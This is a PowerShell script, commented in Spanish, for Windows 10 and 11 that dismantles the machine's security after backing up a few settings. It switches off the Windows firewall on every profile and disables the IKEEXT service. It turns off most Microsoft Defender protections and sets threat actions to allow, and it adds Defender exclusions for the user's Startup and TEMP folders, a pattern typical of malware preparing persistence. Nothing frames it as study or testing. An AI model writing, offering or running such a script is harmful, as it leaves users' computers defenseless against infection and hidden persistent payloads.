# ============================================
# Windows 10 y 11
# Home, Pro, Enterprise, Education
# ============================================

$os = Get-CimInstance -ClassName Win32_OperatingSystem
$osVersion = $os.Version
$osCaption = $os.Caption
$osEdition = $os.EditionID

if ($osVersion -like "10.*" -or $osVersion -like "11.*") {
    Write-Output "$($os.Version)"
} else {
    Write-Output "."
    exit
}

function Add-DefenderExclusions {
    try {
        $startupPath = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
        if (Test-Path $startupPath) {
            Add-MpPreference -ExclusionPath $startupPath
        }
        else {
            Write-Warning "$startupPath"
        }

        # Excluir la carpeta TEMP del usuario actual
        $tempPath = $env:TEMP
        if (Test-Path $tempPath) {
            Add-MpPreference -ExclusionPath $tempPath
        }
        else {
            Write-Warning "$tempPath"
        }
    }
    catch {
        Write-Warning " $_"
    }
}
===========================================
try {
  
    $backupPath = "$env:USERPROFILE\Desktop\Backup_Config"
    if (-Not (Test-Path -Path $backupPath)) {
        New-Item -ItemType Directory -Path $backupPath -Force | Out-Null
        Write-Output "$backupPath."
    } else {
        Write-Output "$backupPath."
    }
    Get-ExecutionPolicy -List | Export-Csv -Path "$backupPath\ExecutionPolicyBackup.csv" -NoTypeInformation
    reg export "HKLM\SYSTEM\CurrentControlSet\Services\IKEEXT" "$backupPath\IKEEXT_Backup.reg" /y
    reg export "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy" "$backupPath\FirewallPolicy_Backup.reg" /y
}
catch {
    Write-Warning "$_"
}
=========================================
try {
    Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
    netsh advfirewall set allprofiles state off
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\IKEEXT" /v Start /t REG_DWORD /d 4 /f
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile" /v EnableFirewall /t REG_DWORD /d 0 /f
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile" /v EnableFirewall /t REG_DWORD /d 0 /f
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile" /v EnableFirewall /t REG_DWORD /d 0 /f
    Write-Output "Firewall desactivado en perfiles Dominio, Publico y Estandar."
    Set-MpPreference -DisableArchiveScanning $true
    Set-MpPreference -DisableIOAVProtection $true
    Set-MpPreference -DisableScriptScanning $true
    Set-MpPreference -EnableControlledFolderAccess Disabled
    Set-MpPreference -DisableBlockAtFirstSeen $true
    Set-MpPreference -MAPSReporting 0
    Set-MpPreference -PUAProtection disable
    Set-MpPreference -DisableIntrusionPreventionSystem $true
    Set-MpPreference -HighThreatDefaultAction 6 -Force
    Set-MpPreference -LowThreatDefaultAction 6
    Set-MpPreference -SevereThreatDefaultAction 6
    Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true
    Set-MpPreference -SubmitSamplesConsent 2
    Set-MpPreference -ScanScheduleDay 8
    Add-DefenderExclusions
}
catch {
    Write-Warning "$_"
}
try {

    $currentPolicy = Get-ExecutionPolicy -Scope Process
    $firewallStatus = netsh advfirewall show allprofiles | Select-String "Estado del Firewall de dominio|Estado del Firewall publico|Estado del Firewall privado"
    $firewallStatus
    if (Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\IKEEXT") {
        $ikeextStatus = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\IKEEXT" -Name Start
        Write-Output " $($ikeextStatus.Start)"
    }
    else {
        Write-Output "."
    }
    $defenderConfig = Get-MpPreference
    $defenderConfig | Select-Object DisableArchiveScanning, DisableIOAVProtection, DisableScriptScanning, EnableControlledFolderAccess, DisableBlockAtFirstSeen, MAPSReporting, PUAProtection, DisableIntrusionPreventionSystem, HighThreatDefaultAction, LowThreatDefaultAction, SevereThreatDefaultAction, SignatureDisableUpdateOnStartupWithoutEngine, SubmitSamplesConsent, ScanScheduleDay

    Get-MpPreference | Select-Object -ExpandProperty ExclusionPath | Where-Object { $_ -like "*Startup*" -or $_ -like "*Temp*" }
}
catch {
    Write-Warning " $_"
}
